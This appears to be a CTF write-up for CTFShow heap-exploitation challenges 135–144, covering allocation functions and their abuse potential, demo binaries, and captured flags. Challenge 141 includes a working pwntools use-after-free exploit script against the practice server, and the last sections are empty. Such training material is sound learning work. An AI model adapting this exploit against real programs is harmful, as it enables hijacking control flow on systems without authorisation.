# CTFShow-Pwn(111-144)



# 堆利用-前置基础

## 135. pwn135

为防止题目难度跨度太大，135-140为演示题目阶段，你可以轻松获取flag,但是希望你能一步步去调试，而不是仅仅去拿到flag。 如何申请堆？



check一下，64位，保护全开了

既然是学习，那就学一下malloc、calloc、realloc吧



1. `malloc` 函数

**函数原型：**

```c
void *malloc(size_t size);
```

**作用：**

- `malloc` 用于从堆上分配一块指定大小的内存，并返回指向这块内存的指针。该内存块中的内容是未初始化的，即内存中的数据是随机的。
- 如果分配失败，则返回 `NULL`。

**用法：**

```c
int *arr = (int *)malloc(10 * sizeof(int));  // 分配 10 个整型的内存
if (arr == NULL) {
    // 错误处理
}
```

**PWN 中的利用点：**

- **未初始化内存**：由于 `malloc` 分配的内存未初始化，攻击者可能利用这一点通过读未初始化内存来泄露敏感信息（如堆上的地址）。
- **堆溢出**：通过不检查边界就写入超出分配内存区域的内容，可以覆盖堆中的数据，甚至修改程序的控制流。



2. `calloc` 函数

**函数原型：**

```c
void *calloc(size_t num, size_t size);
```

**作用：**

- `calloc` 类似于 `malloc`，但是它不仅分配指定大小的内存，还会将该内存初始化为零。
- 如果分配失败，返回 `NULL`。

**用法：**

```c
int *arr = (int *)calloc(10, sizeof(int));  // 分配 10 个整型并初始化为 0
if (arr == NULL) {
    // 错误处理
}
```

**PWN 中的利用点：**

- **内存初始化为零**：由于内存初始化为零，这可能会被攻击者利用来初始化某些结构体（例如，覆盖 `vtable` 来进行攻击）。攻击者也可能通过这种方式操控程序的状态，制造漏洞。
- **堆溢出/堆伪造**：通过在 `calloc` 返回的内存块中进行巧妙操作，攻击者可以伪造堆结构来执行攻击。



3. `realloc` 函数

**函数原型：**

```c
void *realloc(void *ptr, size_t size);
```

**作用：**

- `realloc` 用于调整先前通过 `malloc` 或 `calloc` 分配的内存块的大小。如果新的大小比原来大，`realloc` 会尝试扩展该内存块；如果新的大小比原来小，则会缩小内存块。
- 如果重新分配成功，返回指向新内存区域的指针；如果失败，则返回 `NULL`，并且原内存块不会被释放。

**用法：**

```c
int *arr = (int *)malloc(10 * sizeof(int));
arr = (int *)realloc(arr, 20 * sizeof(int));  // 将数组大小从 10 增加到 20
if (arr == NULL) {
    // 错误处理
}
```

**PWN 中的利用点：**

- **堆重用和溢出**：`realloc` 可能导致原来的内存块被移动或修改，因此攻击者可以利用这一点来影响程序的控制流，尤其是在多次调用 `realloc` 或与其他内存操作一起使用时，攻击者可能通过堆重用来执行任意代码。
- **内存泄漏/非法释放**：如果 `realloc` 返回 `NULL` 且原指针没有被正确处理，程序可能会出现内存泄漏；如果指针没有正确更新，也可能导致对已释放内存的访问。
- **堆溢出攻击**：如果 `realloc` 处理堆上内存的扩展方式不当，可能会出现堆溢出漏洞，允许攻击者控制堆中的数据结构（例如通过覆盖堆上的控制块、函数指针等）。







然后ida看一下程序就知道是输入4拿到flag

然后用gdb看一下这三个函数在heap里面的东西

就是打印个地址

```
p *0x5555556032a0      # 看堆上的值
```

拿到flag：

```
ctfshow{6e5c0e1e-88b9-46f7-95e6-850f590af1ff}
```



## 136. pwn136

如何释放堆？



check一下，还是一样64位，保护全开，依旧学习

这次是这三个函数`ptr_malloc` 、 `ptr_calloc` 、 `ptr_realloc` 、

还有free函数！！！





1. `ptr_malloc` 函数

**函数原型：**

```c
void *ptr_malloc(size_t size);
```

**作用：**

- `ptr_malloc` 是一个自定义的内存分配函数，通常用于分配大小为 `size` 的内存块。
- 它的行为与 `malloc` 类似，但可能会带有额外的功能（如日志记录、堆检查等）。

**用法：**

```c
int *arr = (int *)ptr_malloc(10 * sizeof(int));  // 分配 10 个整型的内存
if (arr == NULL) {
    // 错误处理
}
```

**PWN 中的利用点：**

- **重定向堆内存分配**：攻击者可以通过修改 `ptr_malloc` 的实现来操控堆内存分配的方式。例如，如果函数没有正确检查分配的内存区域，攻击者可以通过堆溢出来覆盖堆上的重要结构（如函数指针、`vtable`）。
- **日志绕过**：如果 `ptr_malloc` 有日志记录的功能，攻击者可能通过合适的输入绕过日志检查，避免暴露攻击行为。



2. `ptr_calloc` 函数

**函数原型：**

```c
void *ptr_calloc(size_t num, size_t size);
```

**作用：**

- `ptr_calloc` 和标准的 `calloc` 函数一样，分配一块内存，并将其初始化为零。
- 如果 `ptr_calloc` 实现不当，攻击者可能会通过构造巧妙的数据触发内存初始化的漏洞。

**用法：**

```c
int *arr = (int *)ptr_calloc(10, sizeof(int));  // 分配并初始化 10 个整型的内存
if (arr == NULL) {
    // 错误处理
}
```

**PWN 中的利用点：**

- **内存初始化漏洞**：由于 `ptr_calloc` 初始化内存为零，攻击者可能通过精心构造的数据来影响后续的内存使用，特别是在内存中保存了控制数据（例如，函数指针、`vtable`）时，攻击者可以通过操作内存中零值的位置来覆盖这些结构，进而控制程序的流向。
- **内存信息泄露**：由于 `calloc` 初始化内存为零，攻击者可能通过分析内存中零值的位置来推测堆的布局，进而实施进一步的攻击（如堆喷射、堆溢出等）。



3. `ptr_realloc` 函数

**函数原型：**

```d
void *ptr_realloc(void *ptr, size_t size);
```

**作用：**

- `ptr_realloc` 是一个自定义的内存重新分配函数，通常用于调整已分配内存块的大小，可能还包含特定的行为（例如内存拷贝、合并空闲块等）。

**用法：**

```c
int *arr = (int *)ptr_malloc(10 * sizeof(int));  // 初始分配
arr = (int *)ptr_realloc(arr, 20 * sizeof(int));  // 扩展数组大小为 20
if (arr == NULL) {
    // 错误处理
}
```

**PWN 中的利用点：**

- **内存重用和溢出**：`ptr_realloc` 会在某些情况下重新分配堆内存，可能会导致堆结构被重用或合并。攻击者可以利用这种重用，通过控制堆内存中的内容来伪造结构，甚至进行堆溢出攻击。
- **堆碎片化和覆盖**：如果 `ptr_realloc` 实现中没有正确处理内存重分配，可能导致内存碎片化，进而引发堆内存覆盖漏洞。攻击者可以操控堆布局，修改堆的控制结构（如指向内存的指针、函数指针等）。
- **UAF（Use-After-Free）漏洞**：如果 `ptr_realloc` 没有正确管理已释放的内存块，可能导致访问已释放内存的情况。攻击者可以通过重复使用这些内存块，触发 UAF 漏洞，从而控制程序执行。



`free` 函数是 C 语言中的一个标准库函数，用于释放之前通过 `malloc`、`calloc` 或 `realloc` 分配的动态内存。正确使用 `free` 是内存管理的关键，它防止了内存泄漏并确保内存得到及时释放。



`free` 函数原型

```c
void free(void *ptr);
```

作用

- `free` 释放由 `malloc`、`calloc` 或 `realloc` 分配的内存块。
- 在释放内存之前，`ptr` 必须指向有效的、动态分配的内存块。释放后，`ptr` 变得无效，但该指针本身不会自动置为 `NULL`，所以它仍然可以被访问（如果没有明确设为 `NULL`）。

用法

```c
int *arr = (int *)malloc(10 * sizeof(int));  // 分配内存
// 使用 arr 进行操作
free(arr);  // 释放内存
```

PWN 中 `free` 的潜在利用点



`free` 本身虽然是用来释放内存的，但如果在某些特殊情况下没有正确处理，它也可能成为攻击的目标。以下是一些常见的利用点：

1. **双重释放（Double Free）**

**漏洞描述：**

- 如果一个程序错误地调用了 `free` 两次来释放相同的内存区域，会导致程序崩溃或者未定义行为。这是因为堆的管理结构可能被破坏，攻击者可以利用这个漏洞控制堆的布局，从而导致堆溢出或其他攻击。

**漏洞示例：**

```c
int *arr = (int *)malloc(10 * sizeof(int));
free(arr);
free(arr);  // 错误：第二次释放相同内存
```

**PWN 中的利用点：**

- 攻击者可以利用双重释放漏洞来破坏堆的状态，并通过后续的内存分配或重用来操控程序。通过精心的堆布局，攻击者可以使用双重释放来覆盖堆的管理结构（例如，堆元数据或函数指针），从而实现代码注入、堆溢出等攻击。



2. **使用后释放（Use-After-Free, UAF）**

**漏洞描述：**

- 如果内存被释放后，程序继续访问该内存区域，就会触发“使用后释放”（UAF）漏洞。这通常发生在指针没有及时被设置为 `NULL`，或者在释放内存后仍然使用指向该内存的指针。

**漏洞示例：**

```c
int *arr = (int *)malloc(10 * sizeof(int));
free(arr);
// 错误：继续访问已释放的内存
printf("%d", arr[0]);  // 未定义行为
```

**PWN 中的利用点：**

- 攻击者可以通过 UAF 漏洞利用堆中的已释放内存。攻击者可以重新分配内存并操控内存中的数据，通常用于覆盖 `vtable`（虚拟函数表）、函数指针或其他控制数据，进而劫持程序控制流。



3. **堆溢出（Heap Overflow）**

**漏洞描述：**

- 如果程序在分配内存时没有正确检查边界，攻击者可能会通过写入超出分配内存区域的内容来修改堆的结构。堆溢出漏洞通常是通过 `free` 后的内存管理不当引发的。

**漏洞示例：**

```c
char *arr = (char *)malloc(10);
strcpy(arr, "This is a string that overflows the buffer.");
free(arr);  // 写入溢出数据后释放内存
```

**PWN 中的利用点：**

- 堆溢出可以通过破坏堆的结构（如堆块的元数据、函数指针等）来实现任意代码执行。通过对已释放内存的访问，攻击者可以覆盖堆上的敏感数据或函数指针，最终劫持程序的控制流。



4. **内存泄漏（Memory Leak）**

**漏洞描述：**

- 如果内存分配后没有及时释放，程序可能会遇到内存泄漏问题。这种问题不会直接导致程序崩溃，但会导致系统资源耗尽。攻击者可能通过消耗大量内存来耗尽系统资源，进而导致拒绝服务（DoS）。

**漏洞示例：**

```c
int *arr = (int *)malloc(10 * sizeof(int));
// 未释放内存
```

**PWN 中的利用点：**

- 虽然内存泄漏通常不是一个直接的攻击手段，但在 PWN 攻击中，攻击者可能利用内存泄漏来观察程序的行为，分析程序的内存布局，从而帮助发现其他漏洞（例如堆溢出、UAF）。



5. **恶意释放（Freeing Non-Heap Memory）**

**漏洞描述：**

- 如果程序错误地调用 `free` 来释放非堆分配的内存（例如栈内存或常量内存），则程序的行为将变得不可预测。这通常是由于程序错误或漏洞导致的。

**漏洞示例：**

```c
int arr[10];
free(arr);  // 错误：栈内存不能释放
```

**PWN 中的利用点：**

- 释放非堆内存可能导致程序崩溃或触发未定义行为，攻击者可以通过这种漏洞进一步探测程序的内存布局，发现更多的漏洞。



还是输入4拿到flag

```
ctfshow{f0911388-70f7-4fa1-b125-9e0be534b1f4}
```





## 137. pwn137

sbrk and brk example



checksec一下 ，64位但是好像canary没开，其他都开了

ida看到一些关键的函数`sbrk`和`brk` 搜索一下看看：



1. `brk` 函数

**函数原型：**

```c
int brk(void *end_data_segment);
```

**作用：**

- `brk` 用于设置程序数据段的结束位置（即堆的顶部）。`end_data_segment` 是新的堆结束地址，程序的堆会被扩展或缩小至此地址。
- 如果调用成功，`brk` 会调整堆的结束地址，并返回 0。如果失败，则返回 `-1`，并设置 `errno`。

**用法示例：**

```c
void *new_end = (void *)0x600000;
if (brk(new_end) == -1) {
    perror("brk failed");
}
```

**PWN 中的利用点：**

- **堆扩展与缩小**：`brk` 直接影响堆的大小。攻击者可以通过操控 `brk` 调整堆的位置，进而覆盖堆上的重要数据结构（如函数指针、`vtable` 等），实现控制流劫持。
- **堆溢出**：通过 `brk` 设置堆的结束位置，攻击者可以在程序内存分配时进行操作，导致堆溢出，覆盖其他堆上的数据。通过精心构造的堆布局，攻击者能够改变堆管理数据，造成缓冲区溢出或控制堆结构，最终执行任意代码。



2. `sbrk` 函数

**函数原型：**

```c
void *sbrk(intptr_t increment);
```

**作用：**

- `sbrk` 用于调整程序的堆空间，增加或减少堆的大小。`increment` 参数指定了增加或减少的字节数。如果 `increment` 为正值，则堆会被扩展；如果为负值，则堆会缩小。
- 返回值是堆调整前的旧堆顶指针（`old_brk`），如果操作失败，则返回 `(void *)-1`，并设置 `errno`。

**用法示例：**

```c
void *old_brk = sbrk(1024);  // 扩展堆空间 1024 字节
if (old_brk == (void *)-1) {
    perror("sbrk failed");
}
```

**PWN 中的利用点：**

- **堆扩展**：类似于 `brk`，`sbrk` 允许攻击者直接扩展或缩小堆的大小。攻击者可以通过多次调用 `sbrk` 来调整堆布局，从而控制堆的分配、释放行为。
- **控制堆位置**：通过使用 `sbrk` 来精确地控制堆的顶端，攻击者可以在堆内存区域内构造特定的数据布局。例如，攻击者可以通过 `sbrk` 调整堆顶指针的位置，使得某些堆块的内容被覆盖或堆管理元数据被操控。
- **堆溢出与覆盖**：如果 `sbrk` 被滥用，攻击者可以通过改变堆的顶端地址来引发堆溢出，覆盖堆上的关键数据结构（如堆管理元数据、函数指针等）。这为执行代码注入、UAF 等漏洞提供了可行的攻击路径。



3. `sbrk` 与 `brk` 的差异

- `brk` 是设置堆的结束位置，精确到一个地址，它只能扩展或缩小堆的大小。
- `sbrk` 是通过增量来调整堆的大小，相当于改变堆的当前顶端，它在功能上比 `brk` 更灵活，因为可以随时根据需要调整堆大小。



连上回车几下就看到flag了：

```
ctfshow{3ca53f50-6341-4c19-ae6f-b8d9e29a46b9}
```



## 138. pwn138

Private anonymous mapping exampl



当用户申请内存过大时，ptmalloc2会选择通过**mmap**()函数创建匿名映射段供用户使用，并通过**unmmap**()函数进行回收。



1. `mmap` 函数

**函数原型：**

```c
void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
```

**参数说明：**

- `addr`：映射的起始地址，通常设置为 `NULL`，由操作系统自动选择一个合适的地址进行映射。
- `length`：映射区域的长度（字节）。
- `prot`：内存保护标志，表示该内存区域的访问权限，如 `PROT_READ`（可读）、`PROT_WRITE`（可写）、`PROT_EXEC`（可执行）。
- `flags`：映射的标志，控制映射的特性，如 `MAP_PRIVATE`（私有映射）、`MAP_SHARED`（共享映射）、`MAP_ANONYMOUS`（匿名映射，不与任何文件关联）。
- `fd`：文件描述符，通常用于文件映射。对于匿名映射，这个值应为 `-1`。
- `offset`：映射的文件偏移量，通常为 0。

**返回值：**

- 如果成功，`mmap` 返回映射区域的起始地址。
- 如果失败，返回 `MAP_FAILED`（通常为 `(void *)-1`）。

**用法示例：**

```c
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>

int fd = open("file.txt", O_RDWR);
void *addr = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
if (addr == MAP_FAILED) {
    perror("mmap failed");
}
```

**PWN 中的利用点：**

- **执行映射区的代码**：通过 `mmap` 映射文件或数据，并通过设置 `PROT_EXEC` 权限，使得映射的内存区域可以被执行。这通常用于绕过数据段的可执行性限制，从而实现代码注入和执行。
- **共享内存和信息泄露**：`MAP_SHARED` 映射类型允许多个进程共享同一块内存。攻击者可以通过映射共享内存区域，从中获取敏感数据（例如，密码、密钥、堆栈内容等），实现信息泄露。
- **堆利用和攻击**：通过 `mmap` 映射堆内存，攻击者可以更精细地控制堆的布局和分配，从而引发堆溢出、UAF 等堆攻击。
- **匿名映射**：使用 `MAP_ANONYMOUS` 可以在没有文件的情况下创建匿名内存区域，攻击者可以利用这个特性来操作不受操作系统管理的内存，从而执行恶意操作。



2. `munmap` 函数

**函数原型：**

```c
int munmap(void *addr, size_t length);
```

**参数说明：**

- `addr`：要解除映射的内存区域的起始地址。
- `length`：解除映射的区域的大小。

**返回值：**

- 成功时返回 0。
- 失败时返回 -1，并设置 `errno`。

**用法示例：**

```c
if (munmap(addr, 4096) == -1) {
    perror("munmap failed");
}
```

**PWN 中的利用点：**

- **UAF（Use-After-Free）漏洞**：在内存映射后释放映射区域，如果攻击者在此区域已经被解除映射后继续访问该内存区域，可能会导致 UAF 漏洞，进而控制程序的执行流。
- **映射区覆盖**：如果程序不小心在解除映射后继续访问该区域，攻击者可能通过映射覆盖等技术来注入恶意代码，或通过操控映射区的内容执行特定的攻击。



3. `mmap` 和 `munmap` 之间的联系

- **映射与解除映射**：`mmap` 将文件或匿名内存区域映射到进程的地址空间，而 `munmap` 用于解除这种映射。两者通常是配对使用的。
- **堆溢出和映射覆盖**：如果程序错误地将 `mmap` 映射区与堆或栈等内存区域结合使用，攻击者可以通过控制映射区的内容，破坏堆布局，导致溢出或控制流劫持。



check一下canary没开，64位

main函数就是了

mmap申请，munmap销毁





拿到flag：

```
ctfshow{b7b26f42-654a-4a6a-ae9b-9088f1a30d7e}
```





## 139. pwn139

演示将flag写入堆中并输出其内容



还是canary没开，还是64位

这个flag_demo演示了如何写进堆中

```c
void flag_demo()
{
  __int64 i; // [rsp+0h] [rbp-20h]
  FILE *stream; // [rsp+8h] [rbp-18h]
  __int64 size; // [rsp+10h] [rbp-10h]
  char *ptr; // [rsp+18h] [rbp-8h]

  stream = fopen("/ctfshow_flag", "rb");
  if ( stream )
  {
    fseek(stream, 0LL, 2);
    size = ftell(stream);
    fseek(stream, 0LL, 0);
    puts("Allocate heap memory:");
    sleep(3u);
    ptr = (char *)malloc(size);
    if ( ptr )
    {
      sleep(1u);
      puts("Read ctfshow_flag");
      sleep(3u);
      if ( fread(ptr, 1uLL, size, stream) == size )
      {
        fclose(stream);
        puts("Here is your flag:");
        for ( i = 0LL; i < size; ++i )
          putchar(ptr[i]);
        sleep(1u);
        puts("free");
        free(ptr);
      }
      else
      {
        perror("Failed to read file");
        fclose(stream);
        free(ptr);
      }
    }
    else
    {
      perror("Memory allocation failed");
      fclose(stream);
    }
  }
  else
  {
    perror("Failed to open file");
  }
}
```



获取文件大小

```c
fseek(stream, 0LL, 2);
size = ftell(stream);
fseek(stream, 0LL, 0);
```

- `fseek(stream, 0LL, 2)` 将文件指针移动到文件末尾，这样可以确定文件的大小。
- `ftell(stream)` 返回文件指针当前的位置，即文件的大小（字节数）。
- `fseek(stream, 0LL, 0)` 将文件指针重新定位到文件开头，准备后续的读取操作。



分配内存

```c
puts("Allocate heap memory:");
sleep(3u);
ptr = (char *)malloc(size);
if ( ptr )
{
  ...
}
else
{
  perror("Memory allocation failed");
  fclose(stream);
}
```

- `malloc(size)` 根据文件的大小 `size` 在堆上分配一块内存，并将返回的指针存储在 `ptr` 中。
- 如果分配成功，则继续读取文件内容；如果分配失败，则输出错误信息并关闭文件。



读取文件内容

```c
puts("Read ctfshow_flag");
sleep(3u);
if ( fread(ptr, 1uLL, size, stream) == size )
{
  fclose(stream);
  puts("Here is your flag:");
  for ( i = 0LL; i < size; ++i )
    putchar(ptr[i]);
  sleep(1u);
  puts("free");
  free(ptr);
}
else
{
  perror("Failed to read file");
  fclose(stream);
  free(ptr);
}
```

- 使用 `fread(ptr, 1, size, stream)` 从文件中读取数据到分配的内存 `ptr` 中。如果读取的字节数等于 `size`，则文件读取成功，并将文件内容打印到控制台。
- 如果读取失败，则输出错误信息，并释放已分配的内存。



释放内存

```c
free(ptr);
```

- 在打印文件内容后，使用 `free(ptr)` 释放之前分配的内存。



gdb调试可以现在根目录下创建个文件ctfshow_flag就可以进行调试了



直接连上就可以拿到flag了

```
ctfshow{bda9b3d8-3f2f-46a3-9a88-bfad4d9dd48a}
```





## 140. pwn140

多线程支持

checksec一下，64位保护全开



还是main函数：

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  pthread_t newthread; // [rsp+10h] [rbp-20h] BYREF
  void *thread_return; // [rsp+18h] [rbp-18h] BYREF
  void *ptr; // [rsp+20h] [rbp-10h]
  unsigned __int64 v8; // [rsp+28h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  init(argc, argv, envp);
  logo();
  v3 = getpid();
  printf("Welcome to per thread arena example::%d\n", v3);
  puts("Before malloc in main thread");
  getchar();
  ptr = malloc(0x3E8uLL);
  puts("After malloc and before free in main thread");
  getchar();
  free(ptr);
  puts("After free in main thread");
  getchar();
  if ( pthread_create(&newthread, 0LL, threadFunc, 0LL) )
  {
    puts("Thread creation error");
    return -1;
  }
  else if ( pthread_join(newthread, &thread_return) )
  {
    puts("Thread join error");
    return -1;
  }
  else
  {
    system("cat /ctfshow_flag");
    return 0;
  }
}
```



主要说明线程的释放销毁heap顺序



连上直接就有了flag：

```
ctfshow{2c9a549f-f272-4b67-9a37-65c0931a46de}
```





## ==141. pwn141（UAF）==

使用已释放的内存

- 远程环境：Ubuntu 18.04



先检查，32位，Partial RELRO、no pie ，其他全开

看到menu，发现有add、delete、print三种操作

v3要小于4才能到下面的，就是要在三种操作中选择

题目以及提示了使用已经释放的内存



看到add函数，第一次malloc结构体，第二次malloc大小

可以看到notelist的结构体为：

```c
*((_DWORD *)&notelist + i) = malloc(8u);
**((_DWORD **)&notelist + i) = print_note_content;
```

8u下一个地址就是存放`print_note_content`



先看del_note，可以看到有两次free的操作，并且没有将指针置空

```c
if ( *((_DWORD *)&notelist + v1) )
  {
    free(*(void **)(*((_DWORD *)&notelist + v1) + 4));
    free(*((void **)&notelist + v1));
    puts("Success");
  }
```



而且打印函数那边没有对函数指针做出验证

```c
if ( *((_DWORD *)&notelist + v1) )
    (**((void (__cdecl ***)(_DWORD))&notelist + v1))(*((_DWORD *)&notelist + v1));
```



再找到use函数入口

```
use_addr = 0x08049684
```



标准的UAF



```python
# -*- coding: utf-8 -*-
from pwn import *
from LibcSearcher import *
from struct import pack
import pwnlib
context(arch='i386',os='linux',log_level='debug')

ip = "pwn.challenge.ctf.show"
port = 28212
elf = ELF('./pwn')

r = remote(ip,port)

def create(size,content):
    r.recvuntil("choice :")
    r.sendline("1")
    r.recvuntil("Note size :")
    r.sendline(str(size))
    r.recvuntil("Content :")
    r.sendline(content)

def delete(index):
    r.recvuntil("choice :")
    r.sendline("2")
    r.recvuntil("Index :")
    r.sendline(str(index))

def show(index):
    r.recvuntil(b"choice :")
    r.sendline(b"3")
    r.recvuntil("Index :")
    r.sendline(str(index))

create(32,"a"*32)
create(32,"b"*32)
delete(0)
delete(1)
create(0x8,p32(0x08049684))
show(0)
r.interactive()
```



拿到flag：

```
ctfshow{d351a228-c4f1-4889-bd10-52abb1bd13be}
```





## ==142. pwn142（off-by-one）==

堆块重叠

check一下amd64、partial relro，pie没开，其他都开了

二话不说运行一波，发现还是经典的选择页面，直接进入ida





## 143. pwn143





## 144. pwn144



